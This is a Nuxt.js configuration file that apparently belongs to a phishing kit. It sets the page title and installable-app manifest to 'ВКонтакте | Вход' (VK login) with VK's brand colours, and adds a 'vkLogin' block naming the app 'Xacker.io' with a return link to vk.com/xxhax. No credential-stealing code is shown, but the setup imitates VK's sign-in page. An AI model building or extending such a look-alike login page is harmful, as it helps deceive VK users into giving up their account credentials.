module.exports = {
  server: {
    host: '127.0.0.1',
    port: 3000
  },

  mode: 'universal',
  /*
   ** Headers of the page
   */
  head: {
    title: 'ВКонтакте | Вход',
    meta: [
      { charset: 'utf-8' },
      { name: 'viewport', content: 'width=device-width, initial-scale=1' },
      { name: 'theme-color', content: '#4680c2' }
    ],
    link: [{ rel: 'icon', type: 'image/x-icon', href: '/favicon.ico' }]
  },
  /*
   ** Customize the progress-bar color
   */
  loading: { color: '#fff' },
  /*
   ** Global CSS
   */
  css: [],
  /*
   ** Plugins to load before mounting the App
   */
  plugins: [],
  /*
   ** Nuxt.js dev-modules
   */
  buildModules: [
    // Doc: https://github.com/nuxt-community/eslint-module
    '@nuxtjs/eslint-module'
  ],
  /*
   ** Nuxt.js modules
   */
  modules: [
    // Doc: https://axios.nuxtjs.org/usage
    'cookie-universal-nuxt',
    '@nuxtjs/pwa'
  ],
  /*
   ** Axios module configuration
   ** See https://axios.nuxtjs.org/options
   */

  vkLogin: {
    appName: 'Xacker.io',
    appLogo:
      'https://cdn3.f-cdn.com/ppic/12697910/logo/13877220/profile_logo_13877220.jpg',
    cancelReturnUrl: 'https://vk.com/xxhax'
  },

  pwa: {
    manifest: {
      name: 'ВКонтакте | Вход',
      lang: 'ru',
      background_color: '#ebedf0',
      theme_color: '#4680c2'
    }
  },

  /*
   ** Build configuration
   */
  build: {
    /*
     ** You can extend webpack config here
     */
    extend(_uConfig, _uCtx) {}
  }
}
